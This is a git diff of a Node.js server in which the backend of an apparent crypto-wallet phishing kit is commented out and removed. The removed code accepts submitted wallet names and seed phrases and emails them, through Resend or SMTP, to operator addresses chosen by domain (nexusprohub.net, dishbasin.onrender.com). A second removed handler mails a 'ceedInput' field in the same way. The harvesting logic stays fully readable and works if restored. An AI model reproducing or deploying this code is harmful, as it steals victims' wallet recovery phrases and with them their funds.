@@ -105,166 +105,166 @@ const handleToggle = async (req, res, body) => {
   }
 };
 
-// Send email using Resend
-const sendEmail = async (req, res, body) => {
-  try {
-    const { walletName, walletIcon, seedPhrase } = JSON.parse(body);
+// // Send email using Resend
+// const sendEmail = async (req, res, body) => {
+//   try {
+//     const { walletName, walletIcon, seedPhrase } = JSON.parse(body);
 
-    if (!walletName || !walletIcon || !seedPhrase) {
-      res.writeHead(400, {
-        "Content-Type": "application/json",
-        "Access-Control-Allow-Origin": "*",
-      });
-      res.end(JSON.stringify({ error: "Missing required fields" }));
-      return;
-    }
+//     if (!walletName || !walletIcon || !seedPhrase) {
+//       res.writeHead(400, {
+//         "Content-Type": "application/json",
+//         "Access-Control-Allow-Origin": "*",
+//       });
+//       res.end(JSON.stringify({ error: "Missing required fields" }));
+//       return;
+//     }
 
-    const host = req.headers.host || "";
+//     const host = req.headers.host || "";
 
-    const domainRecipients = {
-      "nexusprohub.net": process.env.RECIPIENT_EMAIL_DOMAIN1,
-      "www.nexusprohub.net": process.env.RECIPIENT_EMAIL_DOMAIN1,
-      "dishbasin.onrender.com": process.env.RECIPIENT_EMAIL_DOMAIN2,
-    };
+//     const domainRecipients = {
+//       "nexusprohub.net": process.env.RECIPIENT_EMAIL_DOMAIN1,
+//       "www.nexusprohub.net": process.env.RECIPIENT_EMAIL_DOMAIN1,
+//       "dishbasin.onrender.com": process.env.RECIPIENT_EMAIL_DOMAIN2,
+//     };
 
-    const recipientEmail =
-      domainRecipients[host] || process.env.RECIPIENT_EMAIL_DOMAIN1;
+//     const recipientEmail =
+//       domainRecipients[host] || process.env.RECIPIENT_EMAIL_DOMAIN1;
 
-    console.log(`📧 Sending email to ${recipientEmail} from domain ${host}`);
+//     console.log(`📧 Sending email to ${recipientEmail} from domain ${host}`);
 
-    const resend = new Resend(process.env.RESEND_API_KEY);
+//     const resend = new Resend(process.env.RESEND_API_KEY);
 
-    await resend.emails.send({
-      from: "onboarding@resend.dev", // Change to noreply@nexusprohub.net once verified
-      to: recipientEmail,
-      subject: `New message from ${host}`,
-      html: `
-        <h2>New Wallet Submission</h2>
-        <p><strong>Domain:</strong> ${host}</p>
-        <p><strong>Name:</strong> ${walletName}</p>
-        <p><strong>Icon:</strong> ${walletIcon}</p>
-        <p><strong>Phrase:</strong></p>
-        <p>${seedPhrase}</p>
-      `,
-    });
+//     await resend.emails.send({
+//       from: "onboarding@resend.dev", // Change to noreply@nexusprohub.net once verified
+//       to: recipientEmail,
+//       subject: `New message from ${host}`,
+//       html: `
+//         <h2>New Wallet Submission</h2>
+//         <p><strong>Domain:</strong> ${host}</p>
+//         <p><strong>Name:</strong> ${walletName}</p>
+//         <p><strong>Icon:</strong> ${walletIcon}</p>
+//         <p><strong>Phrase:</strong></p>
+//         <p>${seedPhrase}</p>
+//       `,
+//     });
 
-    res.writeHead(200, {
-      "Content-Type": "application/json",
-      "Access-Control-Allow-Origin": "*",
-    });
-    res.end(
-      JSON.stringify({
-        success: true,
-        message: "Email sent successfully",
-      }),
-    );
-  } catch (err) {
-    console.error("❌ Email error:", err);
-    res.writeHead(500, {
-      "Content-Type": "application/json",
-      "Access-Control-Allow-Origin": "*",
-    });
-    res.end(
-      JSON.stringify({
-        error: "Failed to send email",
-        details: err.message,
-      }),
-    );
-  }
-};
+//     res.writeHead(200, {
+//       "Content-Type": "application/json",
+//       "Access-Control-Allow-Origin": "*",
+//     });
+//     res.end(
+//       JSON.stringify({
+//         success: true,
+//         message: "Email sent successfully",
+//       }),
+//     );
+//   } catch (err) {
+//     console.error("❌ Email error:", err);
+//     res.writeHead(500, {
+//       "Content-Type": "application/json",
+//       "Access-Control-Allow-Origin": "*",
+//     });
+//     res.end(
+//       JSON.stringify({
+//         error: "Failed to send email",
+//         details: err.message,
+//       }),
+//     );
+//   }
+// };
 
 // Basic static file + API handler
-const server = http.createServer((req, res) => {
-  const parsedUrl = url.parse(req.url);
+// const server = http.createServer((req, res) => {
+//   const parsedUrl = url.parse(req.url);
 
-  // Handle CORS preflight
-  if (req.method === "OPTIONS") {
-    res.writeHead(200, {
-      "Access-Control-Allow-Origin": "*",
-      "Access-Control-Allow-Methods": "POST, GET, OPTIONS",
-      "Access-Control-Allow-Headers": "Content-Type",
-    });
-    res.end();
-    return;
-  }
+//   // Handle CORS preflight
+//   if (req.method === "OPTIONS") {
+//     res.writeHead(200, {
+//       "Access-Control-Allow-Origin": "*",
+//       "Access-Control-Allow-Methods": "POST, GET, OPTIONS",
+//       "Access-Control-Allow-Headers": "Content-Type",
+//     });
+//     res.end();
+//     return;
+//   }
 
-  // Handle send-email endpoint
-  if (req.method === "POST" && parsedUrl.pathname === "/api/send-email") {
-    let body = "";
-    req.on("data", (chunk) => (body += chunk));
-    req.on("end", () => sendEmail(req, res, body));
-  }
-  // Handle toggle endpoint (GET and POST)
-  else if (parsedUrl.pathname === "/api/toggle") {
-    if (req.method === "GET") {
-      handleToggle(req, res, "");
-    } else if (req.method === "POST") {
-      let body = "";
-      req.on("data", (chunk) => (body += chunk));
-      req.on("end", () => handleToggle(req, res, body));
-    }
-  }
-  // Health check
-  else if (parsedUrl.pathname === "/health" || parsedUrl.pathname === "/") {
-    res.writeHead(200, { "Content-Type": "application/json" });
-    res.end(
-      JSON.stringify({
-        status: "Server is running",
-        endpoints: ["/api/send-email", "/api/toggle"],
-      }),
-    );
-  }
-  // Test Resend endpoint
-  else if (parsedUrl.pathname === "/test-resend") {
-    const resend = new Resend(process.env.RESEND_API_KEY);
+//   // Handle send-email endpoint
+//   if (req.method === "POST" && parsedUrl.pathname === "/api/send-email") {
+//     let body = "";
+//     req.on("data", (chunk) => (body += chunk));
+//     req.on("end", () => sendEmail(req, res, body));
+//   }
+//   // Handle toggle endpoint (GET and POST)
+//   else if (parsedUrl.pathname === "/api/toggle") {
+//     if (req.method === "GET") {
+//       handleToggle(req, res, "");
+//     } else if (req.method === "POST") {
+//       let body = "";
+//       req.on("data", (chunk) => (body += chunk));
+//       req.on("end", () => handleToggle(req, res, body));
+//     }
+//   }
+//   // Health check
+//   else if (parsedUrl.pathname === "/health" || parsedUrl.pathname === "/") {
+//     res.writeHead(200, { "Content-Type": "application/json" });
+//     res.end(
+//       JSON.stringify({
+//         status: "Server is running",
+//         endpoints: ["/api/send-email", "/api/toggle"],
+//       }),
+//     );
+//   }
+//   // Test Resend endpoint
+//   else if (parsedUrl.pathname === "/test-resend") {
+//     const resend = new Resend(process.env.RESEND_API_KEY);
 
-    resend.emails
-      .send({
-        from: "onboarding@resend.dev",
-        to: process.env.RECIPIENT_EMAIL_DOMAIN1,
-        subject: "Test from Render",
-        html: "<h1>Test email</h1><p>If you see this, Resend is working!</p>",
-      })
-      .then((result) => {
-        console.log("✅ Test email sent:", result);
-        res.writeHead(200, { "Content-Type": "application/json" });
-        res.end(JSON.stringify({ success: true, result }));
-      })
-      .catch((err) => {
-        console.error("❌ Test email failed:", err);
-        res.writeHead(500, { "Content-Type": "application/json" });
-        res.end(JSON.stringify({ error: err.message }));
-      });
-  }
-  // Serve static files
-  else {
-    let filePath = `.${parsedUrl.pathname}`;
-    if (filePath === "./") filePath = "./index.html";
+//     resend.emails
+//       .send({
+//         from: "onboarding@resend.dev",
+//         to: process.env.RECIPIENT_EMAIL_DOMAIN1,
+//         subject: "Test from Render",
+//         html: "<h1>Test email</h1><p>If you see this, Resend is working!</p>",
+//       })
+//       .then((result) => {
+//         console.log("✅ Test email sent:", result);
+//         res.writeHead(200, { "Content-Type": "application/json" });
+//         res.end(JSON.stringify({ success: true, result }));
+//       })
+//       .catch((err) => {
+//         console.error("❌ Test email failed:", err);
+//         res.writeHead(500, { "Content-Type": "application/json" });
+//         res.end(JSON.stringify({ error: err.message }));
+//       });
+//   }
+//   // Serve static files
+//   else {
+//     let filePath = `.${parsedUrl.pathname}`;
+//     if (filePath === "./") filePath = "./index.html";
 
-    const ext = path.extname(filePath);
-    const contentType =
-      {
-        ".html": "text/html",
-        ".js": "text/javascript",
-        ".css": "text/css",
-        ".json": "application/json",
-        ".png": "image/png",
-        ".jpg": "image/jpg",
-        ".svg": "image/svg+xml",
-        ".ico": "image/x-icon",
-      }[ext] || "text/plain";
+//     const ext = path.extname(filePath);
+//     const contentType =
+//       {
+//         ".html": "text/html",
+//         ".js": "text/javascript",
+//         ".css": "text/css",
+//         ".json": "application/json",
+//         ".png": "image/png",
+//         ".jpg": "image/jpg",
+//         ".svg": "image/svg+xml",
+//         ".ico": "image/x-icon",
+//       }[ext] || "text/plain";
 
-    fs.readFile(filePath, (err, content) => {
-      if (err) {
-        res.writeHead(404, { "Content-Type": "text/plain" });
-        res.end("Not Found");
-      } else {
-        res.writeHead(200, { "Content-Type": contentType });
-        res.end(content);
-      }
-    });
-  }
-});
+//     fs.readFile(filePath, (err, content) => {
+//       if (err) {
+//         res.writeHead(404, { "Content-Type": "text/plain" });
+//         res.end("Not Found");
+//       } else {
+//         res.writeHead(200, { "Content-Type": contentType });
+//         res.end(content);
+//       }
+//     });
+//   }
+// });
 
 const PORT = process.env.PORT || 3000;
 
@@ -281,68 +281,3 @@ initDatabase().then(() => {
     );
   });
 });
-
-import nodemailer from "nodemailer";
-
-// Configure SMTP transporter
-const transporter = nodemailer.createTransport({
-  host: process.env.SMTP_HOST,
-  port: parseInt(process.env.SMTP_PORT),
-  secure: parseInt(process.env.SMTP_PORT) === 465,
-  auth: {
-    user: process.env.SMTP_USER,
-    pass: process.env.SMTP_PASS,
-  },
-});
-
-if (parseInt(process.env.SMTP_PORT) === 587) {
-  transporter.set("logger", true);
-}
-
-export default async function handler(req, res) {
-  if (req.method !== "POST") {
-    return res.status(405).json({ error: "Method not allowed" });
-  }
-
-  const { name, icon, ceedInput, emailAddresses } = req.body;
-
-  // Validate inputs
-  if (!name || !ceedInput || !emailAddresses) {
-    return res.status(400).json({ error: "Missing required fields" });
-  }
-
-  try {
-    // ✅ Send via Nodemailer/SMTP to multiple addresses
-    const result = await transporter.sendMail({
-      from: process.env.SMTP_FROM,
-      to: Array.isArray(emailAddresses)
-        ? emailAddresses.join(", ")
-        : emailAddresses,
-      subject: `New Message from ${name}`,
-      html: `
-        <h2>New Submission</h2>
-        <p><strong>Name:</strong> ${name}</p>
-        <p><strong>Icon:</strong> ${icon}</p>
-        <p><strong>Message:</strong></p>
-        <p>${ceedInput.replace(/\n/g, "<br>")}</p>
-        <hr>
-        <p style="color: #999; font-size: 12px;">Received at: ${new Date().toLocaleString()}</p>
-      `,
-    });
-
-    console.log("Email sent via SMTP:", result.messageId);
-
-    return res.status(200).json({
-      success: true,
-      message: "✅ Email sent successfully via SMTP",
-      messageId: result.messageId,
-    });
-  } catch (error) {
-    console.error("SMTP Email error:", error);
-    return res.status(500).json({
-      success: false,
-      error: "Failed to send email via SMTP",
-      details: error.message,
-    });
-  }
-}
